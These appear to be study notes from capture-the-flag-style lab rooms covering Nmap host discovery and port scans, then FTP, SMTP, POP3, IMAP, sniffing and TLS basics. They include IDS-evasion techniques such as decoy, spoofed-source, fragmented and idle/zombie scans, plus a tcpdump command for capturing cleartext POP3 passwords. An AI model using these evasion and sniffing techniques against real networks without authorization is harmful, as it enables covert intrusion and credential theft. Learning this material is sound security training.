Nmap’s default behaviour is to use reverse-DNS online hosts. Because the hostnames can reveal a lot, this can be a helpful step. However, if you don’t want to send such DNS queries, you use -n to skip this step.

By default, Nmap will look up online hosts; however, you can use the option -R to query the DNS server even for offline hosts. If you want to use a specific DNS server, you can add the --dns-servers DNS_SERVER option


SUMMARY
Scan Type 	        Example Command
ARP Scan 	        sudo nmap -PR -sn MACHINE_IP/24
ICMP Echo Scan 	        sudo nmap -PE -sn MACHINE_IP/24
ICMP Timestamp Scan 	sudo nmap -PP -sn MACHINE_IP/24
ICMP Address Mask Scan 	sudo nmap -PM -sn MACHINE_IP/24
TCP SYN Ping Scan 	sudo nmap -PS22,80,443 -sn MACHINE_IP/30
TCP ACK Ping Scan 	sudo nmap -PA22,80,443 -sn MACHINE_IP/30
UDP Ping Scan 	        sudo nmap -PU53,161,162 -sn MACHINE_IP/30

Remember to add -sn if you are only interested in host discovery without port-scanning. Omitting -sn will let Nmap default to port-scanning the live hosts.
Option 	Purpose
-n 	no DNS lookup
-R 	reverse-DNS lookup for all hosts
-sn 	host discovery only. Don't scan ports, just probe to see if the host exists
–traceroute: uses an existing probe method to do a full traceroute. Very clever way to map a network even when most stuff is shut down; if you can get a response from, say, ICMP timestamps you can use that to do the traceroute.



    -Pn: no discovery, just assume the host is up.
    -PS: TCP SYN. Tries to open a TCP port; getting back an ACK or RST will both confirm the host is online, so it works whether the port is open or not. Default is port 80, do “-PS99” or whatever to change the port number.
    -PA: TCP ACK. Sends a bogus ACK, expecting a RST back.
    -PU: UDP. Should get an ICMP port unreachable response.
    -PY: SCTP INIT. Similar to -PS, but tries to open an SCTP connection.
    -PE: ICMP echo. Good ol ping
    -PP: ICMP timestamp. One of those tech dead ends that should be removed or disabled (indeed, it’s not present in IPv6). My Linux server seems to respond with the correct time!
    -PM: ICMP address mask. A way to query the subnet mask. Kind of a useful thing really, but Linux doesn’t seem to answer it. Maybe disabled for security?
    -PO: IP protocol ping. Sends unusual IP protocol requests; ICMP, IGMP, and IP-in-IP by default. My Linux datacenter box doesn’t respond to IGMP or IP-in-IP probes.
    -PR: ARP ping. For local ethernets only, bypasses the kernel’s ARP handling and handles ARP itself.  Any ARP reply implies the host exists. Note this is on by default for local networks and short-circuits other types of requests.
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Scanning ports with NMAP
Nmap considers the following six states:

    Open: indicates that a service is listening on the specified port.
    Closed: indicates that no service is listening on the specified port, although the port is accessible. By accessible, we mean that it is reachable and is not blocked by a firewall or other security appliances/programs.
    Filtered: means that Nmap cannot determine if the port is open or closed because the port is not accessible. This state is usually due to a firewall preventing Nmap from reaching that port. Nmap’s packets may be blocked from reaching the port; alternatively, the responses are blocked from reaching Nmap’s host.
    Unfiltered: means that Nmap cannot determine if the port is open or closed, although the port is accessible. This state is encountered when using an ACK scan -sA.
    Open|Filtered: This means that Nmap cannot determine whether the port is open or filtered.
    Closed|Filtered: This means that Nmap cannot decide whether a port is closed or filtered.


-=-=-=
TCP flags in the TCP header
Setting a flag bit means setting its value to 1. From left to right, the TCP header flags are:

    URG: Urgent flag indicates that the urgent pointer filed is significant. The urgent pointer indicates that the incoming data is urgent, and that a TCP segment with the URG flag set is processed immediately without consideration of having to wait on previously sent TCP segments.
    ACK: Acknowledgement flag indicates that the acknowledgement number is significant. It is used to acknowledge the receipt of a TCP segment.
    PSH: Push flag asking TCP to pass the data to the application promptly.
    RST: Reset flag is used to reset the connection. Another device, such as a firewall, might send it to tear a TCP connection. This flag is also used when data is sent to a host and there is no service on the receiving end to answer.
    SYN: Synchronize flag is used to initiate a TCP 3-way handshake and synchronize sequence numbers with the other host. The sequence number should be set randomly during TCP connection establishment.
    FIN: The sender has no more data to send.

-=-=-=-
TCP connect scan
We are interested in learning whether the TCP port is open, not establishing a TCP connection. Hence the connection is torn as soon as its state is confirmed by sending a RST/ACK. You can choose to run TCP connect scan using -sT. It is important to note that if you are not a privileged user (root or sudoer), a TCP connect scan is the only possible option to discover open TCP ports.  A closed TCP port responds to a SYN packet with RST/ACK to indicate that it is not open
-sT 

SYN>
<SYN,ACK 
ACK>
RST,ACK>

Note that we can use -F to enable fast mode and decrease the number of scanned ports from 1000 to 100 most common ports.

It is worth mentioning that the -r option can also be added to scan the ports in consecutive order instead of random order. This option is useful when testing whether ports open in a consistent manner, for instance, when a target boots up
-=-=-=-==-
TCP SYN Scan 
Unprivileged users are limited to connect scan. However, the default scan mode is SYN scan, and it requires a privileged (root or sudoer) user to run it. SYN scan does not need to complete the TCP 3-way handshake; instead, it tears down the connection once it receives a response from the server. Because we didn’t establish a TCP connection, this decreases the chances of the scan being logged. We can select this scan type by using the -sS option

We can see a TCP connect scan -sT traffic. Any open TCP port will require Nmap to complete the TCP 3-way handshake before closing the connection. In the lower half of the following figure, we see how a SYN scan -sS does not need to complete the TCP 3-way handshake; instead, Nmap sends an RST packet once a SYN/ACK packet is received.

TCP SYN scan is the default scan mode when running Nmap as a privileged user, running as root or using sudo, and it is a very reliable choice

-=-=-=-=-=
UDP Scan 
UDP is a connectionless protocol, and hence it does not require any handshake for connection establishment. We cannot guarantee that a service listening on a UDP port would respond to our packets. However, if a UDP packet is sent to a closed port, an ICMP port unreachable error (type 3, code 3) is returned. You can select UDP scan using the -sU option; moreover, you can combine it with another TCP scan.

The following figure shows that if we send a UDP packet to an open UDP port, we cannot expect any reply in return. Therefore, sending a UDP packet to an open port won’t tell us anything.

However, as shown in the figure below, we expect to get an ICMP packet of type 3, destination unreachable, and code 3, port unreachable. In other words, the UDP ports that don’t generate any response are the ones that Nmap will state as open.
-=-=-=-=-
Fine tuning 


You can specify the ports you want to scan instead of the default 1000 ports. Specifying the ports is intuitive by now. Let’s see some examples:

    port list: -p22,80,443 will scan ports 22, 80 and 443.
    port range: -p1-1023 will scan all ports between 1 and 1023 inclusive, while -p20-25 will scan ports between 20 and 25 inclusive.

You can request the scan of all ports by using -p-, which will scan all 65535 ports. If you want to scan the most common 100 ports, add -F. Using --top-ports 10 will check the ten most common ports.

You can control the scan timing using -T<0-5>. -T0 is the slowest (paranoid), while -T5 is the fastest. According to Nmap manual page, there are six templates:

    paranoid (0)
    sneaky (1)
    polite (2)
    normal (3)
    aggressive (4)
    insane (5)

To avoid IDS alerts, you might consider -T0 or -T1. For instance, -T0 scans one port at a time and waits 5 minutes between sending each probe, so you can guess how long scanning one target would take to finish. If you don’t specify any timing, Nmap uses normal -T3. Note that -T5 is the most aggressive in terms of speed; however, this can affect the accuracy of the scan results due to the increased likelihood of packet loss. Note that -T4 is often used during CTFs and when learning to scan on practice targets, whereas -T1 is often used during real engagements where stealth is more important.

Alternatively, you can choose to control the packet rate using --min-rate <number> and --max-rate <number>. For example, --max-rate 10 or --max-rate=10 ensures that your scanner is not sending more than ten packets per second.

Moreover, you can control probing parallelization using --min-parallelism <numprobes> and --max-parallelism <numprobes>. Nmap probes the targets to discover which hosts are live and which ports are open; probing parallelization specifies the number of such probes that can be run in parallel. For instance, --min-parallelism=512 pushes Nmap to maintain at least 512 probes in parallel; these 512 probes are related to host discovery and open ports.

-=-=
Summary 
This room covered three types of scans.
Port Scan Type 	        Example Command
TCP Connect Scan 	nmap -sT MACHINE_IP
TCP SYN Scan 	        sudo nmap -sS MACHINE_IP
UDP Scan 	        sudo nmap -sU MACHINE_IP

These scan types should get you started discovering running TCP and UDP services on a target host.
Option 	        Purpose
-p- 	        all ports
-p1-1023 	scan ports 1 to 1023
-F 	        100 most common ports
-r 	        scan ports in consecutive order
-T<0-5> 	-T0 being the slowest and T5 the fastest
--max-rate 50 	rate <= 50 packets/sec
--min-rate 15 	rate >= 15 packets/sec
--min-parallelism 100 	at least 100 probes in parallel
-=-=-=-=-=-=-=-
NMAP advanced port scans


Let’s start with the following three types of scans:

    Null Scan
    FIN Scan
    Xmas Scan


TCP Null Scan

The null scan does not set any flag; all six flag bits are set to zero. You can choose this scan using the -sN option. A TCP packet with no flags set will not trigger any response when it reaches an open port, as shown in the figure below. Therefore, from Nmap’s perspective, a lack of reply in a null scan indicates that either the port is open or a firewall is blocking the packet.

However, we expect the target server to respond with an RST packet if the port is closed. Consequently, we can use the lack of RST response to figure out the ports that are not closed: open or filtered
 Because the null scan relies on the lack of a response to infer that the port is not closed, it cannot indicate with certainty that these ports are open; there is a possibility that the ports are not responding due to a firewall rule.

-=-=
TCP FIN Scan

The FIN scan sends a TCP packet with the FIN flag set. You can choose this scan type using the -sF option. Similarly, no response will be sent if the TCP port is open. Again, Nmap cannot be sure if the port is open or if a firewall is blocking the traffic related to this TCP port.

However, the target system should respond with an RST if the port is closed. Consequently, we will be able to know which ports are closed and use this knowledge to infer the ports that are open or filtered. It's worth noting some firewalls will 'silently' drop the traffic without sending an RST.

-=-=-=-
TCP Xmas Scan

The Xmas scan gets its name after Christmas tree lights. An Xmas scan sets the FIN, PSH, and URG flags simultaneously. You can select Xmas scan with the option -sX.

Like the Null scan and FIN scan, if an RST packet is received, it means that the port is closed. Otherwise, it will be reported as open|filtered.


On scenario where these three scan types can be efficient is when scanning a target behind a stateless (non-stateful) firewall. A stateless firewall will check if the incoming packet has the SYN flag set to detect a connection attempt. Using a flag combination that does not match the SYN packet makes it possible to deceive the firewall and reach the system behind it. However, a stateful firewall will practically block all such crafted packets and render this kind of scan useless.

-=-=-=
TCP Maimon scan
In this scan, the FIN and ACK bits are set. The target should send an RST packet as a response. However, certain BSD-derived systems drop the packet if it is an open port exposing the open ports. This scan won’t work on most targets encountered in modern networks; however, we include it in this room to better understand the port scanning mechanism and the hacking mindset. To select this scan type, use the -sM option.

Most target systems respond with an RST packet regardless of whether the TCP port is open. In such a case, we won’t be able to discover the open ports. The figure below shows the expected behaviour in the cases of both open and closed TCP ports
As mentioned, because open ports and closed ports are behaving the same way, the Maimon scan could not discover any open ports on the target system.
This type of scan is not the first scan one would pick to discover a system; however, it is important to know about it as you don’t know when it could come in handy

-=-=-=-=-=-=-=-
This task will cover how to perform a TCP ACK scan, a TCP window scan, and how to create your custom flag scan.

TCP ACK Scan

Let’s start with the TCP ACK scan. As the name implies, an ACK scan will send a TCP packet with the ACK flag set. Use the -sA option to choose this scan. As we show in the figure below, the target would respond to the ACK with RST regardless of the state of the port. This behaviour happens because a TCP packet with the ACK flag set should be sent only in response to a received TCP packet to acknowledge the receipt of some data, unlike our case. Hence, this scan won’t tell us whether the target port is open in a simple setup.

This kind of scan would be helpful if there is a firewall in front of the target. Consequently, based on which ACK packets resulted in responses, you will learn which ports were not blocked by the firewall. In other words, this type of scan is more suitable to discover firewall rule sets and configuration.

After setting up the target VM 10.10.255.227 with a firewall, we repeated the ACK scan. This time, we received some interesting results. As seen in the console output below, we have three ports that aren't being blocked by the firewall. This result indicates that the firewall is blocking all other ports except for these three ports.



Window Scan

Another similar scan is the TCP window scan. The TCP window scan is almost the same as the ACK scan; however, it examines the TCP Window field of the RST packets returned. On specific systems, this can reveal that the port is open. You can select this scan type with the option -sW. As shown in the figure below, we expect to get an RST packet in reply to our “uninvited” ACK packets, regardless of whether the port is open or closed.

However, as you would expect, if we repeat our TCP window scan against a server behind a firewall, we expect to get more satisfying results. In the console output shown below, the TCP window scan pointed that three ports are detected as closed. (This is in contrast with the ACK scan that labelled the same three ports as unfiltered.) Although we know that these three ports are not closed, we realize they responded differently, indicating that the firewall does not block them.


Custom Scan

If you want to experiment with a new TCP flag combination beyond the built-in TCP scan types, you can do so using --scanflags. For instance, if you want to set SYN, RST, and FIN simultaneously, you can do so using --scanflags RSTSYNFIN. As shown in the figure below, if you develop your custom scan, you need to know how the different ports will behave to interpret the results in different scenarios correctly.

Finally, it is essential to note that the ACK scan and the window scan were very efficient at helping us map out the firewall rules. However, it is vital to remember that just because a firewall is not blocking a specific port, it does not necessarily mean that a service is listening on that port. For example, there is a possibility that the firewall rules need to be updated to reflect recent service changes. Hence, ACK and window scans are exposing the firewall rules, not the services.

-=-=-=-=-=-
Spoofing and Decoys 

n some network setups, you will be able to scan a target system using a spoofed IP address and even a spoofed MAC address. Such a scan is only beneficial in a situation where you can guarantee to capture the response. If you try to scan a target from some random network using a spoofed IP address, chances are you won’t have any response routed to you, and the scan results could be unreliable.

The following figure shows the attacker launching the command nmap -S SPOOFED_IP 10.10.255.227. Consequently, Nmap will craft all the packets using the provided source IP address SPOOFED_IP. The target machine will respond to the incoming packets sending the replies to the destination IP address SPOOFED_IP. For this scan to work and give accurate results, the attacker needs to monitor the network traffic to analyze the replies.


In brief, scanning with a spoofed IP address is three steps:

    Attacker sends a packet with a spoofed source IP address to the target machine.
    Target machine replies to the spoofed IP address as the destination.
    Attacker captures the replies to figure out open ports.

In general, you expect to specify the network interface using -e and to explicitly disable ping scan -Pn. Therefore, instead of nmap -S SPOOFED_IP 10.10.255.227, you will need to issue nmap -e NET_INTERFACE -Pn -S SPOOFED_IP 10.10.255.227 to tell Nmap explicitly which network interface to use and not to expect to receive a ping reply. It is worth repeating that this scan will be useless if the attacker system cannot monitor the network for responses.

When you are on the same subnet as the target machine, you would be able to spoof your MAC address as well. You can specify the source MAC address using --spoof-mac SPOOFED_MAC. This address spoofing is only possible if the attacker and the target machine are on the same Ethernet (802.3) network or same WiFi (802.11).

Spoofing only works in a minimal number of cases where certain conditions are met. Therefore, the attacker might resort to using decoys to make it more challenging to be pinpointed. The concept is simple, make the scan appears to be coming from many IP addresses so that the attacker’s IP address would be lost among them. As we see in the figure below, the scan of the target machine will appear to be coming from 3 different sources, and consequently, the replies will go the decoys as well.

You can launch a decoy scan by specifying a specific or random IP address after -D. For example, nmap -D 10.10.0.1,10.10.0.2,ME 10.10.255.227 will make the scan of 10.10.255.227 appear as coming from the IP addresses 10.10.0.1, 10.10.0.2, and then ME to indicate that your IP address should appear in the third order. Another example command would be nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME 10.10.255.227, where the third and fourth source IP addresses are assigned randomly, while the fifth source is going to be the attacker’s IP address. In other words, each time you execute the latter command, you would expect two new random IP addresses to be the third and fourth decoy sources.


-=-=-=-=
Fragmented packets

Firewall

A firewall is a piece of software or hardware that permits packets to pass through or blocks them. It functions based on firewall rules, summarized as blocking all traffic with exceptions or allowing all traffic with exceptions. For instance, you might block all traffic to your server except those coming to your web server. A traditional firewall inspects, at least, the IP header and the transport layer header. A more sophisticated firewall would also try to examine the data carried by the transport layer.

IDS

An intrusion detection system (IDS) inspects network packets for select behavioural patterns or specific content signatures. It raises an alert whenever a malicious rule is met. In addition to the IP header and transport layer header, an IDS would inspect the data contents in the transport layer and check if it matches any malicious patterns. How can you make it less likely for a traditional firewall/IDS to detect your Nmap activity? It is not easy to answer this; however, depending on the type of firewall/IDS, you might benefit from dividing the packet into smaller packets.

Fragmented Packets

Nmap provides the option -f to fragment packets. Once chosen, the IP data will be divided into 8 bytes or less. Adding another -f (-f -f or -ff) will split the data into 16 byte-fragments instead of 8. You can change the default value by using the --mtu; however, you should always choose a multiple of 8.

To properly understand fragmentation, we need to look at the IP header in the figure below. It might look complicated at first, but we notice that we know most of its fields. In particular, notice the source address taking 32 bits (4 bytes) on the fourth row, while the destination address is taking another 4 bytes on the fifth row. The data that we will fragment across multiple packets is highlighted in red. To aid in the reassembly on the recipient side, IP uses the identification (ID) and fragment offset, shown on the second row of the figure below.


Let’s compare running sudo nmap -sS -p80 10.20.30.144 and sudo nmap -sS -p80 -f 10.20.30.144. As you know by now, this will use stealth TCP SYN scan on port 80; however, in the second command, we are requesting Nmap to fragment the IP packets.

In the first two lines, we can see an ARP query and response. Nmap issued an ARP query because the target is on the same Ethernet. The second two lines show a TCP SYN ping and a reply. The fifth line is the beginning of the port scan; Nmap sends a TCP SYN packet to port 80. In this case, the IP header is 20 bytes, and the TCP header is 24 bytes. Note that the minimum size of the TCP header is 20 bytes.

With fragmentation requested via -f, the 24 bytes of the TCP header will be divided into multiples of 8 bytes, with the last fragment containing 8 bytes or less of the TCP header. Since 24 is divisible by 8, we got 3 IP fragments; each has 20 bytes of IP header and 8 bytes of TCP header. We can see the three fragments between the fifth and the seventh lines.

Note that if you added -ff (or -f -f), the fragmentation of the data will be multiples of 16. In other words, the 24 bytes of the TCP header, in this case, would be divided over two IP fragments, the first containing 16 bytes and the second containing 8 bytes of the TCP header.

On the other hand, if you prefer to increase the size of your packets to make them look innocuous, you can use the option --data-length NUM, where num specifies the number of bytes you want to append to your packets.
-=-=-=-=-
Idle/Zombie Scan 
Spoofing the source IP address can be a great approach to scanning stealthily. However, spoofing will only work in specific network setups. It requires you to be in a position where you can monitor the traffic. Considering these limitations, spoofing your IP address can have little use; however, we can give it an upgrade with the idle scan.

The idle scan, or zombie scan, requires an idle system connected to the network that you can communicate with. Practically, Nmap will make each probe appear as if coming from the idle (zombie) host, then it will check for indicators whether the idle (zombie) host received any response to the spoofed probe. This is accomplished by checking the IP identification (IP ID) value in the IP header. You can run an idle scan using nmap -sI ZOMBIE_IP 10.10.148.44, where ZOMBIE_IP is the IP address of the idle host (zombie).

The idle (zombie) scan requires the following three steps to discover whether a port is open:

    Trigger the idle host to respond so that you can record the current IP ID on the idle host.
    Send a SYN packet to a TCP port on the target. The packet should be spoofed to appear as if it was coming from the idle host (zombie) IP address.
    Trigger the idle machine again to respond so that you can compare the new IP ID with the one received earlier.

Let’s explain with figures. In the figure below, we have the attacker system probing an idle machine, a multi-function printer. By sending a SYN/ACK, it responds with an RST packet containing its newly incremented IP ID.

1. The attacker will send a SYN packet to the TCP port they want to check on the target machine in the next step. However, this packet will use the idle host (zombie) IP address as the source. Three scenarios would arise. In the first scenario, shown in the figure below, the TCP port is closed; therefore, the target machine responds to the idle host with an RST packet. The idle host does not respond; hence its IP ID is not incremented.

2. In the second scenario, as shown below, the TCP port is open, so the target machine responds with a SYN/ACK to the idle host (zombie). The idle host responds to this unexpected packet with an RST packet, thus incrementing its IP ID.

3. In the third scenario, the target machine does not respond at all due to firewall rules. This lack of response will lead to the same result as with the closed port; the idle host won’t increase the IP ID.

For the final step, the attacker sends another SYN/ACK to the idle host. The idle host responds with an RST packet, incrementing the IP ID by one again. The attacker needs to compare the IP ID of the RST packet received in the first step with the IP ID of the RST packet received in this third step. If the difference is 1, it means the port on the target machine was closed or filtered. However, if the difference is 2, it means that the port on the target was open.

It is worth repeating that this scan is called an idle scan because choosing an idle host is indispensable for the accuracy of the scan. If the “idle host” is busy, all the returned IP IDs would be useless.
-=-=-=-
Getting more details

--reason 
-vvv
-dd 

-=-=-=
Summary
This room covered the following types of scans.
Port Scan Type 	             Example Command
TCP Null Scan 	             sudo nmap -sN 10.10.3.241
TCP FIN Scan 	             sudo nmap -sF 10.10.3.241
TCP Xmas Scan 	             sudo nmap -sX 10.10.3.241
TCP Maimon Scan              sudo nmap -sM 10.10.3.241
TCP ACK Scan 	             sudo nmap -sA 10.10.3.241
TCP Window Scan              sudo nmap -sW 10.10.3.241
Custom TCP Scan              sudo nmap --scanflags URGACKPSHRSTSYNFIN 10.10.3.241
Spoofed Source IP            sudo nmap -S SPOOFED_IP 10.10.3.241
Spoofed MAC Address          --spoof-mac SPOOFED_MAC
Decoy Scan 	             nmap -D DECOY_IP,ME 10.10.3.241
Idle (Zombie) Scan           sudo nmap -sI ZOMBIE_IP 10.10.3.241
Fragment IP data into 8 bytes 	-f
Fragment IP data into 16 bytes 	-ff
Option 	Purpose

--source-port PORT_NUM
	specify source port number

--data-length NUM
	append random data to reach given length

These scan types rely on setting TCP flags in unexpected ways to prompt ports for a reply. Null, FIN, and Xmas scan provoke a response from closed ports, while Maimon, ACK, and Window scans provoke a response from open and closed ports.
Option 	Purpose
--reason 	explains how Nmap made its conclusion
-v 	verbose
-vv 	very verbose
-d 	debugging
-dd 	more details for debugging
-=-=-=-=-=-==-=
Service Detection

Adding -sV to your Nmap command will collect and determine service and version information for the open ports. You can control the intensity with --version-intensity LEVEL where the level ranges between 0, the lightest, and 9, the most complete. -sV --version-light has an intensity of 2, while -sV --version-all has an intensity of 9.

It is important to note that using -sV will force Nmap to proceed with the TCP 3-way handshake and establish the connection. The connection establishment is necessary because Nmap cannot discover the version without establishing a connection fully and communicating with the listening service. In other words, stealth SYN scan -sS is not possible when -sV option is chosen.

-=-=-=
OS detection and traceroute 
-O 
The OS detection is very convenient, but many factors might affect its accuracy. First and foremost, Nmap needs to find at least one open and one closed port on the target to make a reliable guess. Furthermore, the guest OS fingerprints might get distorted due to the rising use of virtualization and similar technologies. Therefore, always take the OS version with a grain of salt.

Traceroute

If you want Nmap to find the routers between you and the target, just add --traceroute. In the following example, Nmap appended a traceroute to its scan results. Note that Nmap’s traceroute works slightly different than the traceroute command found on Linux and macOS or tracert found on MS Windows. Standard traceroute starts with a packet of low TTL (Time to Live) and keeps increasing until it reaches the target. Nmap’s traceroute starts with a packet of high TTL and keeps decreasing it.

t is worth mentioning that many routers are configured not to send ICMP Time-to-Live exceeded, which would prevent us from discovering their IP addresses

-=-=-=
Nmap scripting engine (NSE)

You can specify to use any or a group of these installed scripts; moreover, you can install other user’s scripts and use them for your scans. Let’s begin with the default scripts. You can choose to run the scripts in the default category using --script=default or simply adding -sC. In addition to default, categories include auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, and vuln. A brief description is shown in the following table.
Script Category 	Description
auth 	                Authentication related scripts
broadcast 	        Discover hosts by sending broadcast messages
brute 	                Performs brute-force password auditing against logins
default 	        Default scripts, same as -sC
discovery 	        Retrieve accessible information, such as database tables and DNS names
dos 	                Detects servers vulnerable to Denial of Service (DoS)
exploit 	        Attempts to exploit various vulnerable services
external 	        Checks using a third-party service, such as Geoplugin and Virustotal
fuzzer 	                Launch fuzzing attacks
intrusive 	        Intrusive scripts such as brute-force attacks and exploitation
malware 	        Scans for backdoors
safe 	                Safe scripts that won’t crash the target
version 	        Retrieve service versions
vuln 	                Checks for vulnerabilities or exploit vulnerable services

=-=-=-
Option 	Meaning
-sV 	determine service/version info on open ports
-sV --version-light 	try the most likely probes (2)
-sV --version-all 	try all available probes (9)
-O 	detect OS
--traceroute 	run traceroute to target
--script=SCRIPTS 	Nmap scripts to run
-sC or --script=default 	run default scripts
-A 	equivalent to -sV -O -sC --traceroute
-oN 	save output in normal format
-oG 	save output in grepable format
-oX 	save output in XML format
-oA 	save output in normal, XML and Grepable formats
-=-=-=-=-=-=
Protocols and servers 

The $ indicates that this is not a root terminal.
FTP
A command like STAT can provide some added information. The SYST command shows the System Type of the target (UNIX in this case). PASV switches the mode to passive. It is worth noting that there are two modes for FTP:

    Active: In the active mode, the data is sent over a separate channel originating from the FTP server’s port 20.
    Passive: In the passive mode, the data is sent over a separate channel originating from an FTP client’s port above port number 1023.

The command TYPE A switches the file transfer mode to ASCII, while TYPE I switches the file transfer mode to binary. However, we cannot transfer a file using a simple client such as Telnet because FTP creates a separate connection for file transfer.

FTP could be secured using SSL/TLS by using the FTPS protocol which uses port 990. It is worth mentioning that FTP can also be secured using the SSH protocol which is the SFTP protocol. By default this service listens on port 22, just like SSH

FTPS uses multiple ports and needs a secondary data channel which makes using firewalls more difficult. On the other hand, SFTP uses a single connection between the client and the server and so it is more firewall-friendly
-=-=
#STMP
Email delivery over the Internet requires the following components:

    Mail Submission Agent (MSA)
    Mail Transfer Agent (MTA)
    Mail Delivery Agent (MDA)
    Mail User Agent (MUA)


These are the following five steps that an email needs to go through to reach the recipient’s inbox:

    A Mail User Agent (MUA), or simply an email client, has an email message to be sent. The MUA connects to a Mail Submission Agent (MSA) to send its message.
    The MSA receives the message, checks for any errors before transferring it to the Mail Transfer Agent (MTA) server, commonly hosted on the same server.
    The MTA will send the email message to the MTA of the recipient. The MTA can also function as a Mail Submission Agent (MSA).
    A typical setup would have the MTA server also functioning as a Mail Delivery Agent (MDA).
    The recipient will collect its email from the MDA using their email client.

If the above steps sound confusing, consider the following analogy:

    You (MUA) want to send postal mail.
    The post office employee (MSA) checks the postal mail for any issues before your local post office (MTA) accepts it.
    The local post office checks the mail destination and sends it to the post office (MTA) in the correct country.
    The post office (MTA) delivers the mail to the recipient mailbox (MDA).
    The recipient (MUA) regularly checks the mailbox for new mail. They notice the new mail, and they take it.

In the same way, we need to follow a protocol to communicate with an HTTP server, and we need to rely on email protocols to talk with an MTA and an MDA. The protocols are:

    Simple Mail Transfer Protocol (SMTP)
    Post Office Protocol version 3 (POP3) or Internet Message Access Protocol (IMAP)

We explain SMTP in this task and elaborate on POP3 and IMAP in the following two tasks.

Simple Mail Transfer Protocol (SMTP) is used to communicate with an MTA server. Because SMTP uses cleartext, where all commands are sent without encryption, we can use a basic Telnet client to connect to an SMTP server and act as an email client (MUA) sending a message.

SMTP server listens on port 25 by default. To see basic communication with an SMTP server, we used Telnet to connect to it. Once connected, we issue helo hostname and then start typing our email.

After helo, we issue mail from:, rcpt to: to indicate the sender and the recipient. When we send our email message, we issue the command data and type our message. We issue <CR><LF>.<CR><LF> (or Enter . Enter to put it in simpler terms). The SMTP server now queues the message.

-=-=-=-=
POP3 

Post Office Protocol version 3 (POP3) is a protocol used to download the email messages from a Mail Delivery Agent (MDA) server, as shown in the figure below. The mail client connects to the POP3 server, authenticates, downloads the new email messages before (optionally) deleting them.

First, the user connects to the POP3 server at the POP3 default port 110. Authentication is required to access the email messages; the user authenticates by providing his username USER frank and password PASS D2xc9CgD. Using the command STAT, we get the reply +OK 1 179; based on RFC 1939, a positive response to STAT has the format +OK nn mm, where nn is the number of email messages in the inbox, and mm is the size of the inbox in octets (byte). The command LIST provided a list of new messages on the server, and RETR 1 retrieved the first message in the list. We don’t need to concern ourselves with memorizing these commands; however, it is helpful to strengthen our understanding of such protocol.


In general, your mail client (MUA) will connect to the POP3 server (MDA), authenticate, and download the messages. Although the communication using the POP3 protocol will be hidden behind a sleek interface, similar commands will be issued, as shown in the Telnet session above.

Based on the default settings, the mail client deletes the mail message after it downloads it. The default behaviour can be changed from the mail client settings if you wish to download the emails again from another mail client. Accessing the same mail account via multiple clients using POP3 is usually not very convenient as one would lose track of read and unread messages. To keep all mailboxes synchronized, we need to consider other protocols, such as IMAP.


-=-=-==
IMAP 
Internet Message Access Protocol (IMAP) is more sophisticated than POP3. IMAP makes it possible to keep your email synchronized across multiple devices (and mail clients). In other words, if you mark an email message as read when checking your email on your smartphone, the change will be saved on the IMAP server (MDA) and replicated on your laptop when you synchronize your inbox.

Let’s take a look at sample IMAP commands. In the console output below, we use Telnet to connect to the IMAP server’s default port, and then we authenticate using LOGIN username password. IMAP requires each command to be preceded by a random string to be able to track the reply. So we added c1, then c2, and so on. Then we listed our mail folders using LIST "" "*", before checking if we have any new messages in the inbox using EXAMINE INBOX. We don’t need to memorize these commands; however, we are simply providing the example below to give a vivid image of what happens when the mail client communicates with an IMAP server.


-=-=-==-=-=-=-=-=-=-=-=-=-=-=

Servers implementing these protocols are subject to different kinds of attacks. To name a few, consider:

    Sniffing Attack (Network Packet Capture)
    Man-in-the-Middle (MITM) Attack
    Password Attack (Authentication Attack)
    Vulnerabilities

Attacking protocols and servers
From a security perspective, we always need to think about what we aim to protect; consider the security triad: Confidentiality, Integrity, and Availability (CIA). Confidentiality refers to keeping the contents of the communications accessible to the intended parties. Integrity is the idea of assuring any data sent is accurate, consistent, and complete when reaching its destination. Finally, availability refers to being able to access the service when we need it. Different parties will put varying emphasis on these three. For instance, confidentiality would be the highest priority for an intelligence agency. Online banking will put most emphasis on the integrity of transactions. Availability is of the highest importance for any platform making money by serving ads.

Knowing that we are protecting the Confidentiality, Integrity, and Availability (CIA), an attack aims to cause Disclosure, Alternation, and Destruction (DAD)

-=-=-=
Sniffing attack
We would consider the following
    Tcpdump is a free open source command-line interface (CLI) program that has been ported to work on many operating systems.
    Wireshark is a free open source graphical user interface (GUI) program available for several operating systems, including Linux, macOS and MS Windows.
    Tshark is a CLI alternative to Wireshark.

Consider a user checking his email messages using POP3. First, we are going to use Tcpdump to attempt to capture the username and password. In the terminal output below, we used the command sudo tcpdump port 110 -A. Before explaining this command, we should mention that this attack requires access to the network traffic, for example, via a wiretap or a switch with port mirroring. Alternatively, we can access the traffic exchanged if we launch a successful Man-in-the-Middle (MITM) attack.

We need sudo as packet captures require root privileges. We wanted to limit the number of captured and displayed packets to those exchanged with the POP3 server. We know that POP3 uses port 110, so we filtered our packets using port 110. Finally, we wanted to display the contents of the captured packets in ASCII format, so we added -A


-=-=-==-
SSL/TLS

The protocols we have covered so far in this room are on the application layer. Consider the ISO/OSI model; we can add encryption to our protocols via the presentation layer. Consequently, data will be presented in an encrypted format (ciphertext) instead of its original form.

Protocol 	Default Port 	Secured Protocol 	Default Port with TLS
HTTP 	        80 	        HTTPS 	                443
FTP     	21      	FTPS            	990
SMTP     	25      	SMTPS            	465
POP3     	110      	POP3S            	995
IMAP     	143      	IMAPS            	993

Considering the case of HTTP. Initially, to retrieve a web page over HTTP, the web browser would need at least perform the following two steps:

    Establish a TCP connection with the remote web server
    Send HTTP requests to the web server, such as GET and POST requests.

HTTPS requires an additional step to encrypt the traffic. The new step takes place after establishing a TCP connection and before sending HTTP requests. This extra step can be inferred from the ISO/OSI model in the image presented earlier. Consequently, HTTPS requires at least the following three steps:

    Establish a TCP connection
    Establish SSL/TLS connection
    Send HTTP requests to the webserver

To establish an SSL/TLS connection, the client needs to perform the proper handshake with the server.


After establishing a TCP connection with the server, the client establishes an SSL/TLS connection, as shown in the figure above. The terms might look complicated depending on your knowledge of cryptography, but we can simplify the four steps as:

    The client sends a ClientHello to the server to indicate its capabilities, such as supported algorithms.
    The server responds with a ServerHello, indicating the selected connection parameters. The server provides its certificate if server authentication is required. The certificate is a digital file to identify itself; it is usually digitally signed by a third party. Moreover, it might send additional information necessary to generate the master key, in its ServerKeyExchange message, before sending the ServerHelloDone message to indicate that it is done with the negotiation.
